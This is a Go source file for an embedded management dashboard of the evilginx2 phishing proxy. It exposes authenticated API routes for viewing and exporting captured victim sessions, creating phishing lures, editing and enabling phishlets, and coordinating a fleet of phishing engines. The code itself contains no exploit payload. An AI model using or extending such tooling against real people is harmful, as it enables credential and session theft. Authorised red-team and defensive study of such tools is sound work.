package dashboard

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gorilla/mux"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// Server is the embedded reporting/management dashboard. It serves a JSON API
// and the bundled SPA, reading evilginx's live Config and Database handles.
type Server struct {
	addr         string
	cfg          *core.Config
	db           *database.Database
	proxy        *core.HttpProxy
	blacklist    *core.Blacklist
	store        *Store
	secret       []byte
	phishletsDir string
	version      string
	agentToken   string
	client       *AgentClient
	srv          *http.Server
	hub          *hub
	geoip        *GeoIP
	pollInterval time.Duration
}

// Config bundles what the dashboard needs from the host process.
type Config struct {
	Addr         string // listen address, e.g. 127.0.0.1:8080
	StorePath    string // path to the dashboard's own BuntDB file
	PhishletsDir string
	Version      string
	// AgentToken, when set, runs this server as an engine "agent": a request
	// bearing this token is authenticated as a machine admin (for the fleet
	// dashboard to call), in addition to normal user logins.
	AgentToken string
	// GeoIPCityPath / GeoIPASNPath point to optional MaxMind .mmdb files used to
	// enrich session IPs with geolocation. Empty = feature off.
	GeoIPCityPath string
	GeoIPASNPath  string
}

// New constructs the dashboard server, opening its store and bootstrapping the
// admin account on first run. proxy may be nil (e.g. in tests); when set, it is
// used to provision TLS certificates live on phishlet enable/disable. bl is the
// shared blacklist (may be nil in tests).
func New(c Config, cfg *core.Config, db *database.Database, proxy *core.HttpProxy, bl *core.Blacklist) (*Server, error) {
	store, err := NewStore(c.StorePath)
	if err != nil {
		return nil, err
	}
	secret, err := store.JWTSecret()
	if err != nil {
		return nil, err
	}
	s := &Server{
		addr:         c.Addr,
		cfg:          cfg,
		db:           db,
		proxy:        proxy,
		blacklist:    bl,
		store:        store,
		secret:       secret,
		phishletsDir: c.PhishletsDir,
		version:      c.Version,
		agentToken:   c.AgentToken,
		client:       newAgentClient(),
		hub:          newHub(),
		geoip:        OpenGeoIP(c.GeoIPCityPath, c.GeoIPASNPath),
		pollInterval: 2 * time.Second,
	}
	if err := s.bootstrapAdmin(); err != nil {
		return nil, err
	}
	return s, nil
}

// bootstrapAdmin creates an initial admin account if no users exist. The
// password is taken from EVILGINX_DASH_PASSWORD, or generated and logged once.
func (s *Server) bootstrapAdmin() error {
	n, err := s.store.CountUsers()
	if err != nil {
		return err
	}
	if n > 0 {
		return nil
	}
	pass := os.Getenv("EVILGINX_DASH_PASSWORD")
	generated := false
	if len(pass) < 8 {
		pass = randPassword()
		generated = true
	}
	if _, err := s.store.CreateUser("admin", pass, RoleAdmin); err != nil {
		return err
	}
	if generated {
		log.Warning("dashboard: created initial admin account")
		log.Important("dashboard login -> user: 'admin'  password: '%s'", pass)
		log.Warning("dashboard: set EVILGINX_DASH_PASSWORD to control this, and change it after first login")
	} else {
		log.Important("dashboard: created initial 'admin' account from EVILGINX_DASH_PASSWORD")
	}
	return nil
}

func randPassword() string {
	b := make([]byte, 12)
	rand.Read(b)
	return strings.TrimRight(base64.URLEncoding.EncodeToString(b), "=")
}

// Start runs the HTTP server (blocking). Intended to be launched in a goroutine.
func (s *Server) Start() {
	r := mux.NewRouter()
	s.routes(r)

	s.srv = &http.Server{
		Addr:              s.addr,
		Handler:           securityHeaders(r),
		ReadTimeout:       15 * time.Second,
		ReadHeaderTimeout: 10 * time.Second,
		WriteTimeout:      60 * time.Second,
		IdleTimeout:       120 * time.Second,
	}

	// background watcher pushes live session updates to connected clients
	go s.watchSessions(context.Background())

	bindWarning(s.addr)
	log.Important("dashboard: listening on http://%s", s.addr)
	if err := s.srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Error("dashboard: server error: %v", err)
	}
}

func bindWarning(addr string) {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return
	}
	if host != "127.0.0.1" && host != "localhost" && host != "::1" {
		log.Warning("dashboard: bound to non-loopback address (%s) - ensure it is firewalled or behind a tunnel/VPN", addr)
	}
}

func (s *Server) routes(r *mux.Router) {
	api := r.PathPrefix("/api").Subrouter()

	// public
	api.HandleFunc("/auth/login", s.handleLogin).Methods("POST")
	api.HandleFunc("/health", s.handleHealth).Methods("GET")

	// authenticated (any role)
	api.HandleFunc("/auth/me", s.requireAuth(s.handleMe)).Methods("GET")
	api.HandleFunc("/auth/password", s.requireAuth(s.handleChangeOwnPassword)).Methods("POST")
	api.HandleFunc("/events", s.requireAuth(s.handleEvents)).Methods("GET")
	api.HandleFunc("/stats", s.requireAuth(s.handleStats)).Methods("GET")
	api.HandleFunc("/sessions", s.requireAuth(s.handleListSessions)).Methods("GET")
	api.HandleFunc("/sessions/export", s.requireAuth(s.handleExportSessions)).Methods("GET")
	api.HandleFunc("/sessions/{id:[0-9]+}", s.requireAuth(s.handleGetSession)).Methods("GET")
	api.HandleFunc("/lures", s.requireAuth(s.handleListLures)).Methods("GET")
	api.HandleFunc("/phishlets", s.requireAuth(s.handleListPhishlets)).Methods("GET")
	api.HandleFunc("/config", s.requireAuth(s.handleGetConfig)).Methods("GET")

	// operator+
	api.HandleFunc("/sessions/{id:[0-9]+}", s.requireRole(RoleOperator, s.handleDeleteSession)).Methods("DELETE")
	api.HandleFunc("/lures", s.requireRole(RoleOperator, s.handleCreateLure)).Methods("POST")
	api.HandleFunc("/lures/{index:[0-9]+}", s.requireRole(RoleOperator, s.handleUpdateLure)).Methods("PUT")
	api.HandleFunc("/lures/{index:[0-9]+}", s.requireRole(RoleOperator, s.handleDeleteLure)).Methods("DELETE")
	api.HandleFunc("/lures/{index:[0-9]+}/url", s.requireAuth(s.handleGetLureUrl)).Methods("POST")
	api.HandleFunc("/lures/{index:[0-9]+}/pause", s.requireRole(RoleOperator, s.handlePauseLure)).Methods("POST")
	api.HandleFunc("/lures/{index:[0-9]+}/unpause", s.requireRole(RoleOperator, s.handleUnpauseLure)).Methods("POST")
	api.HandleFunc("/phishlets/validate", s.requireRole(RoleOperator, s.handleValidatePhishlet)).Methods("POST")
	api.HandleFunc("/phishlets/import", s.requireRole(RoleOperator, s.handleImportPhishlet)).Methods("POST")
	api.HandleFunc("/phishlets/child", s.requireRole(RoleOperator, s.handleCreateChildPhishlet)).Methods("POST")
	api.HandleFunc("/phishlets/{name}/enable", s.requireRole(RoleOperator, s.handleEnablePhishlet)).Methods("POST")
	api.HandleFunc("/phishlets/{name}/disable", s.requireRole(RoleOperator, s.handleDisablePhishlet)).Methods("POST")
	api.HandleFunc("/phishlets/{name}/hide", s.requireRole(RoleOperator, s.handleHidePhishlet)).Methods("POST")
	api.HandleFunc("/phishlets/{name}/unhide", s.requireRole(RoleOperator, s.handleUnhidePhishlet)).Methods("POST")
	api.HandleFunc("/phishlets/{name}/unauth_url", s.requireRole(RoleOperator, s.handleSetPhishletUnauthUrl)).Methods("POST")
	api.HandleFunc("/phishlets/{name}/hosts", s.requireAuth(s.handleGetPhishletHosts)).Methods("GET")
	api.HandleFunc("/phishlets/{name}/yaml", s.requireRole(RoleOperator, s.handleGetPhishletYaml)).Methods("GET")
	api.HandleFunc("/phishlets/{name}/yaml", s.requireRole(RoleOperator, s.handleUpdatePhishletYaml)).Methods("PUT")
	api.HandleFunc("/phishlets/{name}/hostname", s.requireRole(RoleOperator, s.handleSetPhishletHostname)).Methods("POST")
	api.HandleFunc("/phishlets/{name}", s.requireRole(RoleOperator, s.handleDeletePhishlet)).Methods("DELETE")

	// admin
	api.HandleFunc("/config", s.requireRole(RoleAdmin, s.handleUpdateConfig)).Methods("PATCH")

	// fleet: engine registry (admin) + connectivity check & forwarding (operator)
	api.HandleFunc("/engines", s.requireRole(RoleOperator, s.handleListEngines)).Methods("GET")
	api.HandleFunc("/engines", s.requireRole(RoleAdmin, s.handleCreateEngine)).Methods("POST")
	api.HandleFunc("/engines/{id}", s.requireRole(RoleAdmin, s.handleUpdateEngine)).Methods("PATCH")
	api.HandleFunc("/engines/{id}", s.requireRole(RoleAdmin, s.handleDeleteEngine)).Methods("DELETE")
	api.HandleFunc("/engines/{id}/check", s.requireRole(RoleOperator, s.handleCheckEngine)).Methods("GET")
	api.HandleFunc("/engines/{id}/r/{path:.*}", s.requireRole(RoleOperator, s.handleEngineForward)).Methods("GET", "POST", "PUT", "DELETE", "PATCH")
	api.HandleFunc("/blacklist", s.requireAuth(s.handleListBlacklist)).Methods("GET")
	api.HandleFunc("/blacklist", s.requireRole(RoleOperator, s.handleAddBlacklist)).Methods("POST")
	api.HandleFunc("/blacklist/remove", s.requireRole(RoleOperator, s.handleRemoveBlacklist)).Methods("POST")
	api.HandleFunc("/blacklist/import", s.requireRole(RoleOperator, s.handleImportBlacklist)).Methods("POST")
	api.HandleFunc("/blacklist/clear", s.requireRole(RoleOperator, s.handleClearBlacklist)).Methods("POST")
	api.HandleFunc("/users", s.requireRole(RoleAdmin, s.handleListUsers)).Methods("GET")
	api.HandleFunc("/users", s.requireRole(RoleAdmin, s.handleCreateUser)).Methods("POST")
	api.HandleFunc("/users/{username}", s.requireRole(RoleAdmin, s.handleUpdateUser)).Methods("PATCH")
	api.HandleFunc("/users/{username}", s.requireRole(RoleAdmin, s.handleDeleteUser)).Methods("DELETE")
	api.HandleFunc("/audit", s.requireRole(RoleAdmin, s.handleListAudit)).Methods("GET")

	api.NotFoundHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeError(w, http.StatusNotFound, "not found")
	})

	// SPA + static assets (everything not under /api)
	r.PathPrefix("/").Handler(spaHandler())
}

// ---- helpers --------------------------------------------------------------

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

func writeError(w http.ResponseWriter, status int, msg string) {
	writeJSON(w, status, map[string]string{"error": msg})
}

func decodeJSON(r *http.Request, v interface{}) error {
	dec := json.NewDecoder(http.MaxBytesReader(nil, r.Body, 1<<20))
	dec.DisallowUnknownFields()
	return dec.Decode(v)
}

func clientIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}
